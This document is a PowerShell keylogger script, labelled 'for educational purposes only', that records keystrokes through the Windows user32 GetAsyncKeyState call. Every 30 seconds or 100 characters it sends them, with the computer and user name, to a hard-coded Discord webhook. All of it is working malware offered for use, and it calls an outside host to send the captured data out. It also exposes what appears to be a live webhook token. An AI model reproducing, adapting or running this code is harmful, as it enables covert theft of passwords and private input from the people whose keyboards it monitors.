# Discord Keylogger - For Educational Purposes Only
# DO NOT USE ILLEGALLY

$webhook = 'https://discord.com/api/webhooks/1292107952076881930/irHQk8Mge8YlJGf3z2jx52fdVy4sZ5DJoX3CgRlFPN_tMr_3n2e9WDIzDH5C4cMM911s'

# Keyboard API
$keyboardCode = 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);}'
Add-Type -TypeDefinition $keyboardCode

# Key mappings
$keyMap = @{}
65..90 | ForEach-Object { $keyMap[$_] = [char]$_ }  # A-Z
48..57 | ForEach-Object { $keyMap[$_] = [char]$_ }  # 0-9
$keyMap[13] = '[ENTER]'
$keyMap[32] = ' '
$keyMap[8] = '[BACK]'
$keyMap[9] = '[TAB]'
$keyMap[190] = '.'
$keyMap[188] = ','

# Variables
$buffer = ''
$lastSend = Get-Date
$totalSent = 0
$cycle = 1
$computer = $env:COMPUTERNAME
$user = $env:USERNAME

Write-Host '=== Discord Keylogger ===' -ForegroundColor Cyan
Write-Host "Computer: $computer" -ForegroundColor Yellow
Write-Host "User: $user" -ForegroundColor Yellow
Write-Host 'Sends every 30 seconds OR 100 characters'
Write-Host 'Press Ctrl+C to stop'
Write-Host '========================='

while($true) {
    # Capture all keys
    $keyMap.Keys | ForEach-Object {
        if([K]::GetAsyncKeyState($_) -eq -32767) {
            $buffer += $keyMap[$_]
            Write-Host $keyMap[$_] -NoNewline -ForegroundColor Green
        }
    }
    
    # Check send conditions
    $timeElapsed = ((Get-Date) - $lastSend).TotalSeconds
    
    if($buffer.Length -ge 100 -or $timeElapsed -ge 30) {
        if($buffer.Length -gt 0) {
            Write-Host "`n[Cycle $cycle] Sending $($buffer.Length) chars..." -ForegroundColor Magenta
            
            $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            $message = "**$computer/$user** | $timestamp`n```$buffer```"
            $payload = @{content = $message} | ConvertTo-Json
            
            try {
                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
                $totalSent += $buffer.Length
                Write-Host "✓ Sent! Total: $totalSent chars" -ForegroundColor Green
            } catch {
                Write-Host "✗ Failed to send" -ForegroundColor Red
            }
            
            $buffer = ''
            $cycle++
        }
        
        $lastSend = Get-Date
        Write-Host "Next send: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Gray
        Write-Host '---'
    }
    
    Start-Sleep -Milliseconds 40
}